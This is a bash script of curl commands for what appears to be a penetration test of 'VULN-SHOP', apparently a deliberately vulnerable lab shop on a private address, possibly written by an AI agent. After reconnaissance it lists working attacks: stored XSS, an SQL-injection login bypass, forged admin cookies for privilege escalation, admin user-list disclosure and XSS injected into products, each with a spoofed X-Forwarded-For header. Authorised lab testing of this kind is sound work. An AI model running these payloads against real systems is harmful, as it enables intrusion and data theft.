#!/bin/bash
# VULN-SHOP Penetration Test Commands

# 1. Initial Reconnaissance
# Check headers and homepage content
curl -v -H "X-Forwarded-For: 10.0.0.103" "http://192.168.0.28:3000"

# 2. Investigate 'SEC' parameter
# Attempt 1: Query Parameter
curl -s -H "X-Forwarded-For: 10.0.0.103" "http://192.168.0.28:3000/?sec=v0" | grep -C 5 "SEC:"
# Attempt 2: Cookie
curl -s --cookie "sec=v0" -H "X-Forwarded-For: 10.0.0.103" "http://192.168.0.28:3000/" | grep -C 5 "SEC:"
# Attempt 3: Custom Header
curl -s -H "X-Forwarded-For: 10.0.0.103" -H "X-Sec-Version: v3" "http://192.168.0.28:3000/board" | grep "VULNERABILITY"
# Attempt 4: Simpler Custom Header
curl -s -H "X-Forwarded-For: 10.0.0.103" -H "Sec: v3" "http://192.168.0.28:3000/board" | grep "VULNERABILITY"


# 3. Explore Pages
# Check /board page
curl -s -H "X-Forwarded-For: 10.0.0.103" "http://192.168.0.28:3000/board"

# Check for robots.txt
curl -s -H "X-Forwarded-For: 10.0.0.103" "http://192.168.0.28:3000/robots.txt"

# Check /login page
curl -s -H "X-Forwarded-For: 10.0.0.103" "http://192.168.0.28:3000/login"

# Check /signup page
curl -s -H "X-Forwarded-For: 10.0.0.103" "http://192.168.0.28:3000/signup"


# 4. Exploit Vulnerabilities
# VULN-001: Stored XSS on /board
# Post the payload
curl -s -X POST --cookie "sec=v1" -H "X-Forwarded-For: 10.0.0.103" --data "content=<script>alert('GEMINI-XSS')</script>" "http://192.168.0.28:3000/board"
# Verify the payload is stored
curl -s -H "X-Forwarded-For: 10.0.0.103" "http://192.168.0.28:3000/board" | grep "GEMINI-XSS"

# VULN-002: SQL Injection on /login
curl -v -X POST -H "X-Forwarded-For: 10.0.0.103" --data "username=' OR '1'='1' --&password=password" "http://192.168.0.28:3000/login"

# VULN-003: Broken Access Control (Privilege Escalation)
curl -s --cookie "user=admin; isAdmin=true; user_id=1" -H "X-Forwarded-For: 10.0.0.103" "http://192.168.0.28:3000/"

# VULN-004: Information Disclosure
curl -s --cookie "user=admin; isAdmin=true; user_id=1" -H "X-Forwarded-For: 10.0.0.103" "http://192.168.0.28:3000/admin/users"

# VULN-005: CSRF on Product Admin (and test for XSS)
curl -s -X POST --cookie "user=admin; isAdmin=true; user_id=1" -H "X-Forwarded-For: 10.0.0.103" --data "name=<script>alert('GEMINI-PRODUCT-XSS')</script>&price=45&description=Washed black with distressed details." "http://192.168.0.28:3000/admin/products/2"
# Verify if XSS is present on homepage
curl -s --cookie "user=admin; isAdmin=true; user_id=1" -H "X-Forwarded-For: 10.0.0.103" "http://192.168.0.28:3000/" | grep "GEMINI-PRODUCT-XSS"

# 5. Signup Test
curl -v -X POST -H "X-Forwarded-For: 10.0.0.103" --data "username=gemini-tester&password=password" "http://192.168.0.28:3000/signup"

